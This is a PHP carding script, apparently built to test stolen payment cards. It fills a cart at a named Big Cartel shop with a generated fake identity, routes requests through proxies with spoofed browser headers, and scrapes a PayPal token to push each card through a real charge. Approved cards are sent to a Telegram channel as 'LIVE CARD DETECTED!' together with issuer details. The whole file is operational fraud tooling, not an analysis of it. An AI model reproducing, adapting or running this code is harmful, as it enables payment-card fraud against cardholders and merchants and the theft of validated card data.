<?php

include 'func.php';
error_reporting(0);
set_time_limit(200);
extract($_GET);

    if(!is_dir("cookies")) mkdir("cookies");
    $cookies = getcwd()."/cookies/cookey".rand(10000, 9999999).".txt";

    list($cc, $mm, $yyyy, $cvv) = explode("|", preg_replace('/[^0-9|]+/', '', $_GET['cards']));
    $card = "$cc|$mm|$yyyy|$cvv";
    $cy_success = "Payment method successfully added.";
    $cy_error = "Unexpected error occured!";
    $scc = implode('+', str_split($cc, 4));
    $m = ltrim($mm, "0");
    if ($m === "") {
      $m = "0";
    }
    $yyyy = strlen($yyyy) == 2 ? '20' . $yyyy : $yyyy;
    $yy = substr($yyyy, 2,2);
    $cc1 = substr($cc, 0,4);
    $cc2 = substr($cc, 4,4);
    $cc3 = substr($cc, 8,4);
    $last4 = substr($cc, 12,4);
    $bin = substr($cc, 0,6);

    $first_digit = substr($cc, 0, 1);
    switch ($first_digit) {
        case '4':
            $brand = 'VI';
            $type1 = 'visa';
            break;
        case '5':
            $brand = 'MC';
            $type1 = 'mastercard';
            break;
        case '6':
            $brand = 'AMEX';
            break;
        default:
            $brand = 'Unknown';
    }

function capture($str, $start, $end) {
    $startPos = strpos($str, $start);
    if ($startPos === false) {
        return '';
    }
    $startPos += strlen($start);
    $endPos = strpos($str, $end, $startPos);
    if ($endPos === false) {
        return '';
    }
    return substr($str, $startPos, $endPos - $startPos);
}

function gen_uid() {
    $hex = '';
    $chars = '0123456789abcdef';
    for ($i = 0; $i < 10; $i++) {
        $hex .= $chars[random_int(0, 15)];
    }
    $suffix = 'mdu6mju6' . random_int(100, 999);
    return 'uid_' . $hex . '_' . $suffix;
}

$session_id = gen_uid();
$metadata_id = gen_uid();
$card_field_id = gen_uid();

$randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
    $data = json_decode($randomShits, true);
    $firstname = explode(" ", $data['name'])[0];
    $lastname = explode(" ", $data['name'])[1];
    $email = $data['email']['address'];
    $street = $data['street1'];
    $local = capture($randomShits, '"street2":', ',"phone"');
    $city = capture($local, '"', ',');
    $state = capture($local, ', ', ' ');
    $phone = str_replace("-", "", $data['phone']);
    $postcode = capture($local, "$state" , '"');                                                             
    $zipApiUrl = 'http://ziptasticapi.com/' . $postcode;
    $stateISO = json_decode(file_get_contents($zipApiUrl))->state;

$arr = [
    'AL' => ['Alabama', 1],'AK' => ['Alaska', 2], 'AS' => ['American Samoa', 3],'AZ' => ['Arizona', 4],'AR' => ['Arkansas', 5],
    'AE' => ['Armed Forces Africa', 6],'AA' => ['Armed Forces Americas', 7], 'AE' => ['Armed Forces Canada', 8],'AE' => ['Armed Forces Europe', 9],
    'AE' => ['Armed Forces Middle East', 10],'AP' => ['Armed Forces Pacific', 11],'CA' => ['California', 12],'CO' => ['Colorado', 13],
    'CT' => ['Connecticut', 14],'DE' => ['Delaware', 15],'DC' => ['District of Columbia', 16],'FM' => ['Federated States Of Micronesia', 17],
    'FL' => ['Florida', 18],'GA' => ['Georgia', 19],'GU' => ['Guam', 20],'HI' => ['Hawaii', 21],'ID' => ['Idaho', 22],'IL' => ['Illinois', 23],
    'IN' => ['Indiana', 24],'IA' => ['Iowa', 25],'KS' => ['Kansas', 26],'KY' => ['Kentucky', 27],'LA' => ['Louisiana', 28],
    'ME' => ['Maine', 29],'MH' => ['Marshall Islands', 30],'MD' => ['Maryland', 31],'MA' => ['Massachusetts', 32],'MI' => ['Michigan', 33],
    'MN' => ['Minnesota', 34],'MS' => ['Mississippi', 35],'MO' => ['Missouri', 36],'MT' => ['Montana', 37],'NE' => ['Nebraska', 38],
    'NV' => ['Nevada', 39],'NH' => ['New Hampshire', 40],'NJ' => ['New Jersey', 41],'NM' => ['New Mexico', 42],'NY' => ['New York', 43],
    'NC' => ['North Carolina', 44],'ND' => ['North Dakota', 45],'MP' => ['Northern Mariana Islands', 46],'OH' => ['Ohio', 47],'OK' => ['Oklahoma', 48],
    'OR' => ['Oregon', 49],'PW' => ['Palau', 50],'PA' => ['Pennsylvania', 51],'PR' => ['Puerto Rico', 52],'RI' => ['Rhode Island', 53],
    'SC' => ['South Carolina', 54],'SD' => ['South Dakota', 55],'TN' => ['Tennessee', 56],'TX' => ['Texas', 57],'UT' => ['Utah', 58],
    'VT' => ['Vermont', 59],'VI' => ['Virgin Islands', 60],'VA' => ['Virginia', 61],'WA' => ['Washington', 62],'WV' => ['West Virginia', 63],
    'WI' => ['Wisconsin', 64],'WY' => ['Wyoming', 65],   
];

$state = '';

foreach ($arr as $key => $value) {
    if ($key == $stateISO) {
        $state = $value[0];
        $regionId = $value[1];
        break;
    }
}    


$count = 0;
ret:
$bin_data = get_bin_info($cc);
$info = $bin_data['info'];
$issuer = $bin_data['issuer'];
$country_card = $bin_data['country_card'];

$shop_data = "https://usaricegear.bigcartel.com";
$store_url = parse_url($shop_data, PHP_URL_HOST);

$item_list = [452415621, 452415897, 452416257, 452416152, 452437179, 452292834, 452415378];
$random_item = $item_list[array_rand($item_list)];

$add_url = "$shop_data/cart";

$add_headers = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Encoding: gzip, deflate",
    "Accept-Language: en-US,en;q=0.9",
    "Content-Type: application/x-www-form-urlencoded",
    "Origin: $shop_data",
    "Referer: $shop_data/product/night-quill-lightning-cap",
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
];

$add_data = http_build_query([
    "cart[add][id]" => $random_item,
    "submit" => ""
]);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $add_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $add_data);
curl_setopt($ch, CURLOPT_HTTPHEADER, $add_headers);
curl_setopt($ch, CURLOPT_ENCODING, "");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cookies, CURLOPT_COOKIEJAR => $cookies]); 
curl_setopt($ch, CURLOPT_PROXY, $proxylocate);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxylogins); 
$add_response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
preg_match('/"id":(\d+),/', $add_response, $id_match); $store_id = $id_match[1];
preg_match('/"currency":"([A-Z]+)"/', $add_response, $currency_match); $currency = strtolower($currency_match[1]);
preg_match('/"stripe_publishable_key":"(pk_live_[^"]+)"/', $add_response, $key_match); $stripe_key = $key_match[1];
#echo '<span class="text text-success">add_response http code:</span> <span class="text text-success">➔ '.$http_code.'</span><br>';
#echo '<span class="text text-success">add_response result:</span> <span class="text text-success">➔ '.$add_response.'</span><br>';
#echo '<span class="text text-success">store_id:</span> <span class="text text-success">➔ '.$store_id.'</span><br>';
#echo '<span class="text text-success">currency:</span> <span class="text text-success">➔ '.$currency.'</span><br>';
#echo '<span class="text text-success">stripe_key:</span> <span class="text text-success">➔ '.$stripe_key.'</span><br>';

$add2_url = $shop_data . "/cart";

$add2_headers = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Encoding: gzip, deflate",
    "Accept-Language: en-US,en;q=0.9",
    "Content-Type: application/x-www-form-urlencoded",
    "Origin: $shop_data",
    "Referer: $shop_data/cart",
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
];

$add2_data = http_build_query([
    "cart[update][$random_item]" => "1",
    "checkout" => ""
]);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $add2_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $add2_data);
curl_setopt($ch, CURLOPT_HTTPHEADER, $add2_headers);
curl_setopt($ch, CURLOPT_ENCODING, "");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cookies, CURLOPT_COOKIEJAR => $cookies]); 
curl_setopt($ch, CURLOPT_PROXY, $proxylocate);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxylogins); 
$add2_response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
#echo '<span class="text text-success">add2_response http code:</span> <span class="text text-success">➔ '.$http_code.'</span><br>';
#echo '<span class="text text-success">add2_response result:</span> <span class="text text-success">➔ '.$add2_response.'</span><br>';

$check_url = $shop_data . "/checkout";

$check_headers = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Encoding: gzip, deflate, br",
    "Accept-Language: en-US,en;q=0.9",
    "Referer: $shop_data/cart",
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $check_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $check_headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false); 
curl_setopt($ch, CURLOPT_HEADER, true); 
curl_setopt($ch, CURLOPT_NOBODY, true); 
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cookies, CURLOPT_COOKIEJAR => $cookies]); 
curl_setopt($ch, CURLOPT_PROXY, $proxylocate);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxylogins); 
$check_response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
preg_match('/Location:\s*(.*?)\s/i', $check_response, $location_match);
$next_url = isset($location_match[1]) ? trim($location_match[1]) : null;
$checkout_code = $next_url ? basename(rtrim($next_url, '/')) : null;
#echo '<span class="text text-success">next_url:</span> <span class="text text-success">➔ '.$next_url.'</span><br>';
#echo '<span class="text text-success">checkout_code:</span> <span class="text text-success">➔ '.$checkout_code.'</span><br>';

$post_url = "https://api.bigcartel.com/store/$store_id/carts/$checkout_code";

$post_headers = [
    "Accept: */*",
    "Accept-Encoding: gzip, deflate, br, zstd",
    "Accept-Language: en-US,en;q=0.9",
    "Content-Type: text/plain;charset=UTF-8",
    "Origin: $shop_data",
    "Referer: $shop_data/",
    'Sec-CH-UA: "Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
    "Sec-CH-UA-Mobile: ?0",
    'Sec-CH-UA-Platform: "Windows"',
    "Sec-Fetch-Dest: empty",
    "Sec-Fetch-Mode: cors",
    "Sec-Fetch-Site: same-site",
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
];

$post_data = [
    "buyer_email" => $email,
    "buyer_first_name" => $firstname,
    "buyer_last_name" => $lastname,
    "shipping_address_1" => "3/480 Waterworks Rd",
    "shipping_address_2" => "",
    "shipping_city" => "hayward",
    "shipping_state" => "CA",
    "buyer_phone_number" => "+16501259412",
    "shipping_country_id" => "43",
    "shipping_zip" => "94545",
    "buyer_opted_in_to_marketing" => "0"
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $post_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($post_data));
curl_setopt($ch, CURLOPT_HTTPHEADER, $post_headers);
curl_setopt($ch, CURLOPT_ENCODING, "");
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cookies, CURLOPT_COOKIEJAR => $cookies]); 
curl_setopt($ch, CURLOPT_PROXY, $proxylocate);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxylogins); 
$out_response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$json_response = json_decode($out_response, true);
$total_cents = $json_response["total_cents"] ?? null;
$item_amount = $total_cents !== null ? number_format($total_cents / 100, 2, '.', '') : null;
#echo '<span class="text text-success">item_amount:</span> <span class="text text-success">➔ '.$item_amount.'</span><br>';

$params = [
    "type" => "number",
    "clientID" => "AbPSFDwkxJ_Pxau-Ek8nKIMWIanP8jhAdSXX5MbFoCq_VkpAHX7DZEbfTARicVRWOVUgeUt44lu7oHF-",
    "sessionID" => $session_id,
    "clientMetadataID" => $metadata_id,
    "cardFieldsSessionID" => $card_field_id,
    "env" => "production",
    "debug" => "false",
    "locale.country" => "US",
    "locale.lang" => "en",
    "currency" => "USD",
    "intent" => "capture",
    "commit" => "true",
    "vault" => "false",
    "style.input.font-size" => "1rem",
    "style.input.font-family" => '"Inter", sans-serif',
    "style.input.padding" => ".75rem",
    "merchantID.0" => "SGNAUC55MREVG"
];

$query = http_build_query($params);
$tk_url = "https://www.paypal.com/smart/card-field?" . $query;

$tk_headers = [
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language: en-US,en;q=0.9",
    "Cache-Control: max-age=0",
    "Upgrade-Insecure-Requests: 1"
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $tk_url);
curl_setopt($ch, CURLOPT_HTTPHEADER, $tk_headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
#curl_setopt($ch, CURLOPT_PROXY, $proxylocate);
#curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxylogins); 
$tk_response = curl_exec($ch);
$tk_token = preg_match('/"facilitatorAccessToken":"(A21A[A-Za-z0-9_-]+)"/', $tk_response, $tk_matches) ? $tk_matches[1] : null;
#echo '<span class="text text-success">tk_token:</span> <span class="text text-success">➔ '.$tk_token.'</span><br>';

$referer_url = $create_url . '?' . http_build_query($params, '', '&', PHP_QUERY_RFC3986);

$pp_order_url = "https://api.bigcartel.com/store/$store_id/carts/$checkout_code/paypal/orders";

$pp_order_headers = [
    "Content-Type: application/json",
    "Origin: https://usaricegear.bigcartel.com",
    "Referer: https://usaricegear.bigcartel.com/",
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
];

$ch = curl_init($pp_order_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $pp_order_headers);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{}');

$pp_order_response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);
#echo "pp_order_response code: $http_code\n";
#echo "pp_order_response: $pp_order_response\n";
$response_json = json_decode($pp_order_response, true);
$paypal_order_id = $response_json["paypal_order_id"] ?? null;

$pp_url = "https://www.paypal.com/v2/checkout/orders/$paypal_order_id/confirm-payment-source";

$pp_headers = [
    "accept: application/json",
    "content-type: application/json",
    "authorization: Bearer $tk_token",
    "origin: https://www.paypal.com",
    "referer: $referer_url",
    "paypal-client-metadata-id: $metadata_id",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
];

$pp_data = [
    "payment_source" => [
        "card" => [
            "number" => $cc,
            "security_code" => $cvv,
            "expiry" => "$yyyy-$mm",
            "billing_address" => [
                "country_code" => "US",
                "postal_code" => "94545"
            ]
        ]
    ]
];

$ch = curl_init($pp_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $pp_headers);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($pp_data));
$pp_response = curl_exec($ch);
$pp_http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);
#echo "pp_response code: $pp_http_code\n";
#echo "pp_response: $pp_response\n";
$response_data = json_decode($pp_response, true);
$status = $response_data['status'] ?? '';
$name = $response_data['name'] ?? '';

if ($status === 'APPROVED') {
    $chk_url = "https://api.bigcartel.com/store/$store_id/checkouts";

    // Step 1: Make initial POST request to get checkout redirect URL
    $chk_headers = [
        "accept: */*",
        "accept-language: en-US,en;q=0.9",
        "content-type: application/json",
        "origin: https://usaricegear.bigcartel.com",
        "referer: https://usaricegear.bigcartel.com/",
        "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
    ];

    $chk_data = json_encode([
        "cart_token" => $checkout_code,
        "paypal_order_id" => $paypal_order_id
    ]);

    $ch = curl_init($chk_url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_HTTPHEADER => $chk_headers,
        CURLOPT_POSTFIELDS => $chk_data,
        CURLOPT_HEADER => true, 
    ]);

    $response = curl_exec($ch);
    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $header_text = substr($response, 0, $header_size);
    curl_close($ch);
    preg_match('/Location:\s*(.*)/i', $header_text, $matches);
    $redirect_url = trim($matches[1] ?? '');

    $res_headers = [
        "accept: */*",
        "accept-language: en-US,en;q=0.9",
        "origin: https://usaricegear.bigcartel.com",
        "priority: u=1, i",
        "referer: https://usaricegear.bigcartel.com/",
        "sec-ch-ua: \"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\"",
        "sec-ch-ua-mobile: ?0",
        "sec-ch-ua-platform: \"Windows\"",
        "sec-fetch-dest: empty",
        "sec-fetch-mode: cors",
        "sec-fetch-site: same-site",
        "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
    ];

    $attempts = 10;
    for ($i = 1; $i <= $attempts; $i++) {
        $ch = curl_init($redirect_url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HTTPHEADER => $res_headers,
        ]);

        $result = curl_exec($ch);
        curl_close($ch);

        $data = json_decode($result, true);
        $status = strtolower($data['status'] ?? '');
        $receipt_url = $data['order_receipt_url'] ?? null;
        #print_r($data);

        // Check for success keywords
        if (preg_match('/approved|approve|success|complete|completed|succeeded|authorise|authorised|authorized|authorize/i', $status)) {
            echo '<span class="text text-success">Charge</span> <span class="text text-success">➔ '.$card.' ➔ ✔️ You’ve been billed $' . $item_amount . ' — your receipt has been sent to your Telegram 📤.</span><br>';
            $message = "🔊<b>LIVE CARD DETECTED!</b>\n" .
                    "✉️ <b>CARD:</b> $card\n" .
                    "💸 <b>AMOUNT BILLED:</b> \$$item_amount\n\n" .
                    "ℹ️ <b>🧾 Payment Details</b>\n" .
                    "<b>🔗 Receipt:</b> <a href=\"{$receipt_url}\">🔎 View Receipt</a>\n" .
                    "ℹ️ <b>Info:</b> $info\n" .
                    "🏦 <b>Issuer:</b> $issuer\n" .
                    "🌍 <b>Country:</b> $country_card\n" .
                    "🌐 <b>CREATED BY:</b> I AM ATOMIC LANG MALAKAS!";
                sendToTelegram($message,$telegram);
            break;
        }

        // If not processing, show error
        if ($status !== 'processing') {
            $error_message = $data['errors']['base'][0] ?? 'Unknown error';
            echo '<span class="text text-danger">Decline</span> <span class="text text-danger">➔ '.$card.' ➔ 🛡️ '.$error_message.'</span><br>';
            break;
        }

        sleep(2);
    }

    if ($status === 'processing') {
        echo '<span class="text text-danger">Decline</span> <span class="text text-danger">➔ '.$card.' ➔ ❌ Still processing after '.$attempts.' tries.</span><br>';
    }
} elseif ($name === 'UNPROCESSABLE_ENTITY') {
    echo '<span class="text text-danger">Decline</span> <span class="text text-danger">➔ '.$card.' ➔ ⚠️ Payment could not be processed due to a blocked card/BIN.</span><br>';
} else {
    echo '<span class="text text-danger">Decline</span> <span class="text text-danger">➔ '.$card.' ➔ ⚠️ Unable to continue — PayPal token not found or unknown issue.('.$pp_http_code.')</span><br>';
    #echo '<span class="text text-danger">Decline</span> <span class="text text-danger">➔ '.$card.' ➔ ⚠️ Unknown error occured. '.$pp_response.'('.$pp_http_code.')</span><br>';
}

unset($ch);
unlink($cookies);
flush();
ob_flush();
ob_end_flush();

?>